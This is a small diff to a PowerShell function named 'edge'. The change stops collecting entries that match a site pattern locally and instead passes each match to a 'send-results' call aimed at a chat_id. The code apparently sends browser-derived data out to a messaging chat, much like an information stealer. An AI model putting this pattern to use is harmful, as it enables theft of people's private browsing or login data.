@@ -12,9 +12,8 @@ function edge{
     $Value | ForEach-Object { 
       $Key = $_ 
       if ($Key -match $Site){ 
-        $Out += "$_ "
+        send-results -chat_id $chat_id -texto $_
         } 
       } 
     }
-  $global:execute=$Out
 }
